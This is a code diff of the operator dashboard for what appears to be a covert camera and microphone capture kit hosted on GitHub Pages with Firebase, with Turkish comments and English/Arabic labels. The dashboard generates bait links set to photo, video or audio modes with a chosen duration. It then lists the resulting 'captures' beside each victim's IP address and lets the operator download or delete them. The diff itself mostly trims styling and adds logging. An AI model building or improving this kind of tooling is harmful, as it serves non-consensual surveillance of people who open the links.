@@ -27,53 +27,45 @@
         .title span { color: #ff0040; }
         .header-right { display: flex; gap: 15px; align-items: center; }
         .access-badge { color: #00ff41; border: 1px solid #00ff41; padding: 5px 15px; border-radius: 25px; font-size: 0.75rem; }
-        .lang-btn { background: transparent; border: 1px solid #00ff41; color: #00ff41; padding: 5px 15px; border-radius: 25px; cursor: pointer; font-family: monospace; font-size: 0.75rem; transition: 0.2s; }
+        .lang-btn { background: transparent; border: 1px solid #00ff41; color: #00ff41; padding: 5px 15px; border-radius: 25px; cursor: pointer; font-family: monospace; font-size: 0.75rem; }
         .lang-btn.active { background: #00ff41; color: #000; }
         .logout-btn { background: #ff0040; border: none; color: #fff; padding: 5px 15px; border-radius: 25px; cursor: pointer; }
         .stats-grid { display: flex; gap: 20px; flex-wrap: wrap; margin-bottom: 25px; }
         .stat-card { background: rgba(10,10,10,0.9); border: 1px solid #00ff41; border-radius: 12px; padding: 20px; flex: 1; text-align: center; }
-        .stat-card h4 { color: #00ff41; font-size: 0.7rem; margin-bottom: 8px; letter-spacing: 1px; }
+        .stat-card h4 { color: #00ff41; font-size: 0.7rem; margin-bottom: 8px; }
         .stat-card .value { color: #ff0040; font-size: 2rem; font-weight: bold; }
         .panel { background: rgba(10,10,10,0.95); border: 1px solid #00ff41; border-radius: 16px; padding: 25px; margin-bottom: 25px; }
         .panel h3 { color: #00ff41; margin-bottom: 20px; border-left: 3px solid #00ff41; padding-left: 15px; }
         body.rtl .panel h3 { border-left: none; border-right: 3px solid #00ff41; padding-left: 0; padding-right: 15px; }
         .duration-slider { display: flex; align-items: center; gap: 15px; margin-bottom: 20px; flex-wrap: wrap; background: #050505; padding: 12px; border-radius: 12px; }
         .duration-slider label { color: #00ff41; }
-        .duration-slider input { flex: 1; max-width: 300px; background: #1f1f1f; height: 4px; -webkit-appearance: none; border-radius: 2px; }
-        .duration-slider input:focus { outline: none; }
-        .duration-slider input::-webkit-slider-thumb { width: 16px; height: 16px; border-radius: 50%; background: #00ff41; cursor: pointer; -webkit-appearance: none; }
+        .duration-slider input { flex: 1; max-width: 300px; background: #1f1f1f; height: 4px; -webkit-appearance: none; }
+        .duration-slider input::-webkit-slider-thumb { width: 16px; height: 16px; border-radius: 50%; background: #00ff41; cursor: pointer; }
         .duration-value { color: #ff0040; font-weight: bold; background: #000; padding: 4px 12px; border-radius: 20px; }
         .link-buttons { display: flex; gap: 12px; flex-wrap: wrap; margin-bottom: 20px; }
         .gen-link { background: transparent; border: 1px solid #00ff41; color: #00ff41; padding: 10px 20px; cursor: pointer; border-radius: 40px; font-family: monospace; transition: 0.2s; font-weight: bold; }
-        .gen-link:hover { background: #00ff41; color: #000; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,255,65,0.3); }
+        .gen-link:hover { background: #00ff41; color: #000; transform: translateY(-2px); }
         .gen-link-fast { border-color: #ffaa00; color: #ffaa00; }
-        .gen-link-fast:hover { background: #ffaa00; color: #000; }
         .output-box { background: #050505; border: 1px dashed #00ff41; border-radius: 12px; padding: 15px; font-size: 0.75rem; word-break: break-all; margin-top: 15px; }
         .copy-btn { background: #00ff41; border: none; padding: 4px 12px; border-radius: 15px; cursor: pointer; font-weight: bold; margin-left: 10px; }
         .btn-group { display: flex; gap: 12px; margin-bottom: 25px; flex-wrap: wrap; }
-        .btn { background: transparent; border: 1px solid #00ff41; color: #00ff41; padding: 10px 20px; cursor: pointer; border-radius: 40px; font-family: monospace; transition: 0.2s; }
-        .btn:hover { background: #00ff41; color: #000; transform: translateY(-2px); }
+        .btn { background: transparent; border: 1px solid #00ff41; color: #00ff41; padding: 10px 20px; cursor: pointer; border-radius: 40px; }
+        .btn:hover { background: #00ff41; color: #000; }
         .btn-danger { border-color: #ff0040; color: #ff0040; }
-        .btn-danger:hover { background: #ff0040; color: #fff; }
-        .card { background: #050505; border: 1px solid #00ff41; border-radius: 12px; margin-bottom: 20px; overflow: hidden; transition: 0.2s; }
-        .card:hover { border-color: #ff0040; box-shadow: 0 0 15px rgba(255,0,64,0.2); }
+        .card { background: #050505; border: 1px solid #00ff41; border-radius: 12px; margin-bottom: 20px; overflow: hidden; }
         .card-header { background: #0a0a0a; padding: 12px 18px; border-bottom: 1px solid #00ff41; display: flex; justify-content: space-between; flex-wrap: wrap; gap: 10px; }
         .card-header .ip { color: #00ff41; font-size: 0.8rem; font-weight: bold; }
         .card-header .time { color: #888; font-size: 0.7rem; }
         .media-strip { display: flex; overflow-x: auto; gap: 12px; padding: 18px; }
-        .media-strip img, .media-strip video { width: 140px; height: 140px; object-fit: cover; border: 2px solid #00ff41; border-radius: 10px; cursor: pointer; transition: 0.2s; }
-        .media-strip img:hover, .media-strip video:hover { transform: scale(1.05); border-color: #ff0040; }
+        .media-strip img, .media-strip video { width: 140px; height: 140px; object-fit: cover; border: 2px solid #00ff41; border-radius: 10px; cursor: pointer; }
         .card-footer { padding: 12px 18px; border-top: 1px solid #00ff4133; display: flex; justify-content: flex-end; gap: 10px; }
         .download-btn { background: #00ff41; color: #000; border: none; padding: 6px 16px; border-radius: 20px; cursor: pointer; font-weight: bold; }
         .delete-single { background: #ff0040; color: #fff; border: none; padding: 6px 16px; border-radius: 20px; cursor: pointer; }
-        .loading { text-align: center; color: #00ff41; padding: 50px; font-size: 1rem; }
+        .loading { text-align: center; color: #00ff41; padding: 50px; }
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 1000; justify-content: center; align-items: center; cursor: pointer; }
         .modal img, .modal video { max-width: 95%; max-height: 95%; border: 3px solid #00ff41; border-radius: 16px; }
         .modal-close { position: absolute; top: 25px; right: 35px; color: #00ff41; font-size: 40px; cursor: pointer; }
-        .modal-close:hover { color: #ff0040; }
-        ::-webkit-scrollbar { height: 6px; background: #000; }
-        ::-webkit-scrollbar-thumb { background: #00ff41; border-radius: 10px; }
-        @media (max-width: 768px) { .media-strip img, .media-strip video { width: 100px; height: 100px; } .gen-link { padding: 8px 16px; font-size: 0.7rem; } body { padding: 12px; } }
+        @media (max-width: 768px) { .media-strip img, .media-strip video { width: 100px; height: 100px; } .gen-link { padding: 8px 16px; font-size: 0.7rem; } }
     </style>
 </head>
 <body>
@@ -147,81 +139,38 @@
     const auth = getAuth(app);
     const db = getFirestore(app);
     
-    // 🔥 GITHUB PAGES İÇİN BASE URL - KENDİ REPO ADINI YAZ!
-    // Örnek: https://kullaniciadi.github.io/repo-adi
     const BASE_URL = window.location.origin + window.location.pathname.replace(/\/[^/]*$/, '');
-    // Bu otomatik olarak mevcut URL'den alır, manuel de yazabilirsin:
-    // const BASE_URL = "https://kullaniciadiniz.github.io/repo-adiniz";
 
-    // ========== TAM ÇEVİRİLER (İNGİLİZCE / ARAPÇA) ==========
+    // Çeviriler
     const translations = {
         en: {
-            accessText: "ACCESS: GRANTED",
-            myCaptures: "MY CAPTURES",
-            totalMedia: "TOTAL MEDIA",
-            generateLink: "⟳ GENERATE LINK",
-            durationLabel: "🎬 VIDEO DURATION:",
-            photo1: "📸 PHOTO (1)",
-            photo5: "📸 5 PHOTOS",
-            videoOnly: "🎬 VIDEO (NO AUDIO)",
-            audioOnly: "🎤 AUDIO ONLY",
-            videoAudio: "🎬🎤 VIDEO+AUDIO",
-            refresh: "⟳ REFRESH",
-            clearAll: "⛧ CLEAR ALL",
-            logout: "⛧ LOGOUT",
-            copy: "COPY",
-            linkLabel: "🔗 LINK:",
-            delete: "DELETE",
-            downloadAll: "⬇ DOWNLOAD ALL",
-            noData: "[ NO DATA ]",
-            loading: "⟳ LOADING...",
-            confirmDelete: "⛧ Delete this capture?",
-            confirmClearAll: "⛧ Delete ALL your captures?",
-            sec: "sec",
-            photo: "PHOTO",
-            photos: "PHOTOS",
-            video: "VIDEO",
-            audio: "AUDIO",
-            videoAudioMode: "VIDEO+AUDIO"
+            accessText: "ACCESS: GRANTED", myCaptures: "MY CAPTURES", totalMedia: "TOTAL MEDIA",
+            generateLink: "⟳ GENERATE LINK", durationLabel: "🎬 VIDEO DURATION:",
+            photo1: "📸 PHOTO (1)", photo5: "📸 5 PHOTOS", videoOnly: "🎬 VIDEO (NO AUDIO)",
+            audioOnly: "🎤 AUDIO ONLY", videoAudio: "🎬🎤 VIDEO+AUDIO", refresh: "⟳ REFRESH",
+            clearAll: "⛧ CLEAR ALL", logout: "⛧ LOGOUT", copy: "COPY", linkLabel: "🔗 LINK:",
+            delete: "DELETE", downloadAll: "⬇ DOWNLOAD ALL", noData: "[ NO DATA ]",
+            loading: "⟳ LOADING...", confirmDelete: "⛧ Delete this capture?",
+            confirmClearAll: "⛧ Delete ALL your captures?", sec: "sec",
+            photo: "PHOTO", photos: "PHOTOS", video: "VIDEO", audio: "AUDIO", videoAudioMode: "VIDEO+AUDIO"
         },
         ar: {
-            accessText: "الوصول: ممنوح",
-            myCaptures: "التقاطاتي",
-            totalMedia: "إجمالي الوسائط",
-            generateLink: "⟳ إنشاء رابط",
-            durationLabel: "🎬 مدة الفيديو:",
-            photo1: "📸 صورة (1)",
-            photo5: "📸 5 صور",
-            videoOnly: "🎬 فيديو (بدون صوت)",
-            audioOnly: "🎤 صوت فقط",
-            videoAudio: "🎬🎤 فيديو+صوت",
-            refresh: "⟳ تحديث",
-            clearAll: "⛧ مسح الكل",
-            logout: "⛧ تسجيل الخروج",
-            copy: "نسخ",
-            linkLabel: "🔗 الرابط:",
-            delete: "حذف",
-            downloadAll: "⬇ تحميل الكل",
-            noData: "[ لا توجد بيانات ]",
-            loading: "⟳ جاري التحميل...",
-            confirmDelete: "⛧ حذف هذا العنصر؟",
-            confirmClearAll: "⛧ حذف جميع العناصر؟",
-            sec: "ثانية",
-            photo: "صورة",
-            photos: "صور",
-            video: "فيديو",
-            audio: "صوت",
-            videoAudioMode: "فيديو+صوت"
+            accessText: "الوصول: ممنوح", myCaptures: "التقاطاتي", totalMedia: "إجمالي الوسائط",
+            generateLink: "⟳ إنشاء رابط", durationLabel: "🎬 مدة الفيديو:",
+            photo1: "📸 صورة (1)", photo5: "📸 5 صور", videoOnly: "🎬 فيديو (بدون صوت)",
+            audioOnly: "🎤 صوت فقط", videoAudio: "🎬🎤 فيديو+صوت", refresh: "⟳ تحديث",
+            clearAll: "⛧ مسح الكل", logout: "⛧ تسجيل الخروج", copy: "نسخ", linkLabel: "🔗 الرابط:",
+            delete: "حذف", downloadAll: "⬇ تحميل الكل", noData: "[ لا توجد بيانات ]",
+            loading: "⟳ جاري التحميل...", confirmDelete: "⛧ حذف هذا العنصر؟",
+            confirmClearAll: "⛧ حذف جميع العناصر؟", sec: "ثانية",
+            photo: "صورة", photos: "صور", video: "فيديو", audio: "صوت", videoAudioMode: "فيديو+صوت"
         }
     };
 
     let currentLang = localStorage.getItem('app_language') || 'en';
     let currentUser = null;
-    let myData = [];
 
-    function t(key) {
-        return translations[currentLang][key] || translations.en[key];
-    }
+    function t(key) { return translations[currentLang][key] || translations.en[key]; }
 
     function applyLanguage() {
         document.getElementById('accessText').innerText = t('accessText');
@@ -242,34 +191,24 @@
         const val = document.getElementById('videoDuration').value;
         document.getElementById('durationValue').innerText = val + ' ' + t('sec');
         
-        // RTL desteği
         if (currentLang === 'ar') {
             document.body.classList.add('rtl');
             document.documentElement.dir = 'rtl';
-            document.documentElement.lang = 'ar';
         } else {
             document.body.classList.remove('rtl');
             document.documentElement.dir = 'ltr';
-            document.documentElement.lang = 'en';
         }
     }
 
     function setLanguage(lang) {
         currentLang = lang;
         localStorage.setItem('app_language', lang);
-        if (currentUser) {
-            sessionStorage.setItem('currentUser', JSON.stringify({
-                uid: currentUser.uid, email: currentUser.email, role: currentUser.role, language: lang
-            }));
-        }
         applyLanguage();
         loadMyData();
     }
 
-    const durationSlider = document.getElementById('videoDuration');
-    const durationValue = document.getElementById('durationValue');
-    durationSlider.addEventListener('input', () => { 
-        durationValue.innerText = durationSlider.value + ' ' + t('sec'); 
+    document.getElementById('videoDuration').addEventListener('input', function() {
+        document.getElementById('durationValue').innerText = this.value + ' ' + t('sec');
     });
 
     async function loadMyData() {
@@ -278,20 +217,20 @@
         listDiv.innerHTML = `<div class="loading">${t('loading')}</div>`;
         
         try {
-            // INDEX GEREKTİRMEZ - sadece where kullanılır, orderBy yok
+            console.log("🔍 Loading data for user:", currentUser.uid);
             const q = query(collection(db, "captures"), where("userId", "==", currentUser.uid));
             const snapshot = await getDocs(q);
-            myData = [];
-            let totalMedia = 0;
             
+            let myData = [];
+            let totalMedia = 0;
             snapshot.forEach(docSnap => {
                 const data = docSnap.data();
                 myData.push({ id: docSnap.id, ...data });
                 totalMedia += (data.media?.length || 0);
             });
-            
-            // İstemci tarafında sıralama (en yeni önce)
             myData.sort((a, b) => (b.unix || 0) - (a.unix || 0));
+            
+            console.log("📊 Found", myData.length, "captures");
             
             document.getElementById('captureCount').innerText = myData.length;
             document.getElementById('mediaCount').innerText = totalMedia;
@@ -316,7 +255,7 @@
                 }
                 let mediaHtml = '';
                 for (let m of media) {
-                    const isVideo = m.match(/\.(mp4|webm|mov)/i) || item.mode.includes('video');
+                    const isVideo = m.match(/\.(mp4|webm|mov)/i);
                     if (isVideo) {
                         mediaHtml += `<video src="${m}" onclick="showMedia('${m}', true)"></video>`;
                     } else {
@@ -327,7 +266,7 @@
                     <div class="card">
                         <div class="card-header">
                             <div class="ip">🌐 IP: ${item.ip || 'unknown'}</div>
-                            <div class="time">⛧ ${date.toLocaleString(currentLang === 'ar' ? 'ar-EG' : 'en-US')} | ${modeText} ${item.duration ? '('+item.duration+' '+t('sec')+')' : ''}</div>
+                            <div class="time">⛧ ${date.toLocaleString()} | ${modeText} ${item.duration ? '('+item.duration+' '+t('sec')+')' : ''}</div>
                         </div>
                         <div class="media-strip">${mediaHtml}</div>
                         <div class="card-footer">
@@ -339,8 +278,8 @@
             }
             listDiv.innerHTML = html;
         } catch(err) {
+            console.error("❌ Error loading data:", err);
             listDiv.innerHTML = `<div class="loading">❌ ${err.message}</div>`;
-            console.error(err);
         }
     }
     
@@ -361,7 +300,7 @@
         if (isVideo) {
             modalContent.innerHTML = `<video src="${url}" controls autoplay style="max-width:95%; max-height:95%;"></video>`;
         } else {
-            modalContent.innerHTML = `<img src="${url}" alt="media" style="max-width:95%; max-height:95%;">`;
+            modalContent.innerHTML = `<img src="${url}" style="max-width:95%; max-height:95%;">`;
         }
         modal.style.display = 'flex';
     };
@@ -376,18 +315,19 @@
     
     async function clearAll() {
         if (!confirm(t('confirmClearAll'))) return;
-        for (let item of myData) {
-            try { await deleteDoc(doc(db, "captures", item.id)); } catch(e) {}
+        const q = query(collection(db, "captures"), where("userId", "==", currentUser.uid));
+        const snapshot = await getDocs(q);
+        for (const docSnap of snapshot.docs) {
+            await deleteDoc(doc(db, "captures", docSnap.id));
         }
         await loadMyData();
     }
     
-    // 🔥 LİNK OLUŞTURMA - İSTEDİĞİN FORMATTA
     function generateLink(mode) {
         if (!currentUser) return;
         let url = `${BASE_URL}/?mode=${mode}&uid=${currentUser.uid}`;
         if (mode === 'videoonly' || mode === 'videoaudio' || mode === 'audio') {
-            url += `&duration=${durationSlider.value}`;
+            url += `&duration=${document.getElementById('videoDuration').value}`;
         }
         document.getElementById('linkOutput').innerHTML = `${t('linkLabel')} <a href="${url}" target="_blank" style="color:#00ff41">${url}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${url}')">${t('copy')}</button>`;
     }
@@ -399,7 +339,7 @@
     document.getElementById('genVideoAudioBtn').onclick = () => generateLink('videoaudio');
     document.getElementById('refreshBtn').onclick = loadMyData;
     document.getElementById('clearAllBtn').onclick = clearAll;
-    document.getElementById('logoutBtn').onclick = async () => { await signOut(auth); sessionStorage.removeItem('currentUser'); window.location.href = 'login.html'; };
+    document.getElementById('logoutBtn').onclick = async () => { await signOut(auth); window.location.href = 'login.html'; };
     document.getElementById('langBtn').onclick = () => setLanguage(currentLang === 'en' ? 'ar' : 'en');
     
     const modal = document.getElementById('modal');
@@ -408,14 +348,7 @@
     onAuthStateChanged(auth, (user) => {
         if (user) {
             currentUser = user;
-            // Dili session'dan al
-            const savedUser = sessionStorage.getItem('currentUser');
-            if (savedUser) {
-                try {
-                    const saved = JSON.parse(savedUser);
-                    if (saved.language) currentLang = saved.language;
-                } catch(e) {}
-            }
+            console.log("✅ User logged in:", user.uid, user.email);
             applyLanguage();
             loadMyData();
         } else {
